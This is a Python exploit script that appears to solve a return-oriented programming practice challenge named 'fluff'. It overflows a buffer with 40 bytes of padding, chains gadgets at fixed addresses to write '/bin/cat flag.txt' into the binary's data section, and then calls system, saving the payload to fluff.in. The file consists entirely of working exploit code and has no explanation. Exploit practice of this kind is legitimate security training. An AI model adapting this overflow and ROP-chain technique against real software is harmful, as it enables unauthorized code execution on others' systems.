#!/usr/bin/env python

import sys
import pwn
import time
import struct

import util

load = 0x00400b3b
store = 0x00400b34

xor_load = 0x00400b40
xor_store = 0x00400b30

pop_rdi = 0x00400b39

# load r11:
# pop r12
# xor r11, r11
# xor r11, r12

# load r11
# xchg r11, r10
# load r11
# mov [r10], r11

def pack(a):
    if type(a) == str:
        return a
    else:
        return struct.pack("<Q", a)

def chain(a):
    return ''.join(map(pack, a))

# modifies r13
def load_r12(val):
    return pack(0x00400832) + pack(val)

# modifies edi, r14
def load_r11(val):
    return (
        load_r12(val) +
        chain((
            0x00400822,
            0, # r14 padding
            0x0040082f,
            0, # r12 padding
        ))
    )

# modifies r11
def load_r10(val):
    return (
        load_r11(val) +
        chain((
            0x00400840,
            0, # r15 padding
        ))
    )


def write_string(loc, st):
    ch = ''
    for i in xrange(0, len(st), 8):
        data = st[i:i+8]
        data += '\0' * (8-len(data))
        ch += load_r10(loc + i)
        ch += load_r11(data)
        ch += chain((
            0x0040084e,
            0,
            0,
            ))
    return ch

def main():
    data_section = 0x00601050
    system = 0x00400810

    ch = 'a' * 40
    ch += write_string(data_section, '/bin/cat flag.txt')
    ch += pack(system)

    with open('fluff.in', 'wb') as f:
        f.write("{}\n".format(ch))

if __name__ == '__main__':
    main()
